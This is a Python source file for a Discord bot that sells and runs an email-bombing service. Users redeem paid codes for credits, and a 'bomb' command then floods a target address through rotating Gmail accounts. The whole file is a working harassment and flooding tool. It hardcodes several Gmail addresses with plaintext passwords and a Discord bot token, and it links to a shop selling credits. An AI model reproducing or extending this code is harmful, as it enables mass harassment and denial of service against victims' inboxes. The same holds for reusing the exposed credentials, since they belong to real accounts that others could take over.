import sys
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
import smtplib
import os
import discord
from collections import defaultdict
from datetime import datetime
import random
import string
import pickle
import time

bot = commands.Bot(command_prefix='*')

uses = defaultdict(int)

with (open("dict.pickle", "rb")) as openfile:
    uses = pickle.load(openfile)

def _details(emailTarget, emailFreq):
    mailAddresses = ["freefooduk@gmail.com", "mobilegameratyt@gmail.com", "bobatyourhouse6@gmail.com", "joshdrewoffer@gmail.com", "lonquehere@gmail.com", "Freeflightsuk@gmail.com", "123gamerz4eva@gmail.com", "bestnetworkuk@gmail.com"]
    mailPasswords = ['Minecraft786', 'Yahyeabdulle94', 'Yahyeabdulle94', 'Minecraft786', 'Minecraft786', 'Minecraft786', 'Minecraft786', 'Minecraft786']
    mailTarget = emailTarget                                                                                                                                                                                                               
    mailFreq = int(emailFreq)                                                                                                                                                                                                                                                                                                                  
    mailServer = 'smtp.gmail.com'
    mailPort = int(587)
    #mailFromAddr = chooseMail
    #mailFromPwd = indexPass
    mailSubject = "Good Morning"
    mailMmessage = "Hope you are having a good morning!"

    mailMsg = '''To: %s\nSubject %s\n%s\n
    ''' % (mailTarget, mailSubject, mailMmessage)
    counter=0
    counterMail=0
    for email in range(0,int(emailFreq*0.5)):
        
        s = smtplib.SMTP(mailServer, mailPort)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(mailAddresses[counterMail], mailPasswords[counterMail])
        s.sendmail(mailAddresses[counterMail], mailTarget, mailMsg)

        counter+=1
        if (counter%15) == 0:
            counterMail += 1
            if (counterMail%15):
                s.close()
            if counterMail > 12:
                counterMail = 0
                #counter=0
            

@bot.command(pass_context=True)
async def redeem(ctx, *arg):

    with open('codes1k.txt', 'r+') as cd1:
        t = cd1.read()
        to_delete = arg[0]
        cd1.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 1000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 1000 emails`")
            else:
                None
            if line != to_delete:
                cd1.write(line + '\n')
        cd1.truncate()        

    with open('codes2k.txt', 'r+') as cd2:
        t = cd2.read()
        to_delete = arg[0]
        cd2.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 2500
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 2500 emails`")
            else:
                None
            if line != to_delete:
                cd2.write(line + '\n')
        cd2.truncate()

    with open('codes3k.txt', 'r+') as cd3:
        t = cd3.read()
        to_delete = arg[0]
        cd3.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 5000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 5000 emails`")
            else:
                None
            if line != to_delete:
                cd3.write(line + '\n')
        cd3.truncate()

    with open('codes4k.txt', 'r+') as cd4:
        t = cd4.read()
        to_delete = arg[0]
        cd4.seek(0)
        for line in t.split('\n'):
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 10000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed 10000 emails`")
            else:
                None
            if line != to_delete:
                cd4.write(line + '\n')
        cd4.truncate()

    with open('secretkey.txt', 'r+') as cd5:
        t = cd5.readlines()
        for line in t:
            if line.strip() == arg[0]:
                uses[ctx.message.author.id] += 100000000
                await ctx.send(f"\n > `{ctx.message.author.name} has claimed the secret emails`")
            else:
                None       

@bot.command(pass_context=True)
async def balance(ctx):
    await ctx.send(f"\n > `{ctx.message.author.name}'s Balance: {uses[ctx.message.author.id]}`")
    pickle_out = open("dict.pickle", "wb")
    pickle.dump(uses, pickle_out)
    pickle_out.close

@bot.command(pass_context=True)
async def bomb(ctx, *arg):
    emailTarget = arg[0]
    emailFreq = int(arg[1])
    guild = ctx.message.guild
    channel = guild.get_channel(676047567401779222)
    if ctx.message.channel == channel:
        if emailFreq >= 700:
            if (uses[ctx.message.author.id]) >= emailFreq:
                await ctx.author.send(f"\n > Email bomb started at {datetime.now()}")
                await ctx.send(f"\n >>> `Email bomb started, I have DMed you with start and end time! \n This bomb cost {emailFreq}`")
                uses[ctx.message.author.id] -= emailFreq
                '''
                chooseMail = random.choice(mailAddresses)
                indexMail = mailAddresses.index(chooseMail)
                indexPass = mailPasswords[indexMail]
                counter=0
                for i in range(int(emailFreq*0.3)):
                    _details(emailTarget, emailFreq, chooseMail, indexPass)
                    counter+=1
                    if (counter%15) == 0:
                        time.sleep(7)
                        chooseMail = random.choice(mailAddresses)
                        indexMail = mailAddresses.index(chooseMail)
                        indexPass = mailPasswords[indexMail]
                        '''
                try:
                    _details(emailTarget, emailFreq)
                except:
                    time.sleep(30)
                    await ctx.author.send(f"\n > Email bomb completed, finished at {datetime.now()}")
                await ctx.author.send(f"\n > Email bomb completed, finished at {datetime.now()}")
                pickle_out = open("dict.pickle", "wb")
                pickle.dump(uses, pickle_out)
                pickle_out.close
            else:
                await ctx.send(f"\n >>> `{ctx.message.author.name} \n You don't have enough credits! \n Buy more at ` <https://shoppy.gg/@plugbot>") 
        else:
            await ctx.send(f"\n >>> `{ctx.message.author.name} \n Minimum num. of emails is 700! \n Buy more at ` <https://shoppy.gg/@plugbot>")
    else:
        await ctx.send(f"\n >>> `Wrong channel`")

bot.run("Njc1OTk5OTAxMDI4NzEyNDU4.XkXAOQ.g5QE_lVEjcxXHe66TDT73wPzWgg")
